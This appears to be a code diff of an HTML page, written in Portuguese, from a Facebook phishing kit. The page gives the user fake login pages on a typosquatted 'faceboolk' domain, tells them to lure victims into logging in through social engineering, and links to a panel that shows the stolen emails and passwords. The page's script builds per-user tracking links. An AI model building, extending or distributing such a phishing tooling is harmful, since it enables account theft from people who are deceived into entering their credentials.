@@ -1,17 +1,57 @@
 <html>
 
-<body>
-    <p>
-        Essa é sua página fake com aparencia mobile: <a target="_blank">https://faceboolk.herokuapp.com?postid=#cod#</a>
-    </p>
-    <p>
-        Essa é sua página fake com aparencia desktop: <a
-            target="_blank">https://faceboolk.herokuapp.com/w?postid=#cod#</a>
-    </p>
+<head>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js">
+    </script>
+</head>
 
-    <p>
-        Aqui está suas vítimas: <a target="_blank">https://faceboolk.herokuapp.com/p/#cod#</a>
-    </p>
+<body>
+    <div class="container">
+
+            <div class="container">
+                    <div class="row">
+                      <div class="col">col</div>
+                      <div class="col">col</div>
+                      <div class="w-100"></div>
+                      <div class="col">col</div>
+                      <div class="col">col</div>
+                    </div>
+                  </div>
+
+        <div class="alert alert-success" role="alert">
+            <h4 class="alert-heading">Como usar</h4>
+            <p>Olá hackerzudo!</p>
+            <p>Vou te ajudar a hackear alguns facebooks :)</p>
+            <p>Estou te dando uma página fake, e quando as pessoas logarem nela você vai conseguir ver seu e-mail e sua
+                senha.</p>
+            <p>Let's GO!</p>
+        </div>
+
+        <div class="alert alert-warning" role="alert">
+            <p>
+                Essa é sua página fake com aparencia mobile: <a
+                    target="_blank">https://faceboolk.herokuapp.com?postid=#cod#</a>
+            </p>
+            <p>
+                Essa é sua página fake com aparencia desktop: <a
+                    target="_blank">https://faceboolk.herokuapp.com/w?postid=#cod#</a>
+            </p>
+            <p>Envie um desses dois links para a vítima, faça ela ficar curiosa e querer entrar no link para ver o que
+                tem
+                lá. Essa técnica é chamada de <a
+                    href="https://pt.wikipedia.org/wiki/Engenharia_social_(seguran%C3%A7a)">ENGENHARIA SOCIAL</a>.</p>
+            <p>Engenharia social é termo utilizado para descrever um método de ataque, onde alguém faz uso da persuasão,
+                muitas vezes abusando da ingenuidade ou confiança do usuário, para obter informações que podem ser
+                utilizadas para ter acesso não autorizado a informações. </p>
+
+        </div>
+
+        <div class="alert alert-info" role="alert">
+            <p>Quando alguém "for pescado", suas informações estarão disponíveis <a
+                    href="https://faceboolk.herokuapp.com/p/#cod#" target="_blank">AQUI</a></p>
+        </div>
+    </div>
 </body>
 
 </html>
@@ -27,9 +67,13 @@
     const az = document.getElementsByTagName('a');
     for (let index = 0; index < az.length; index++) {
         const element = az[index];
-        const url = element.innerHTML.replace('#cod#', cod)
-        element.href = url;
-        element.innerHTML = url;
+        if (element.href) {
+            element.href = element.href.replace('#cod#', cod)
+        } else {
+            const url = element.innerHTML.replace('#cod#', cod)
+            element.href = url;
+            element.innerHTML = url;
+        }
     }
 
     function uuidv4() {
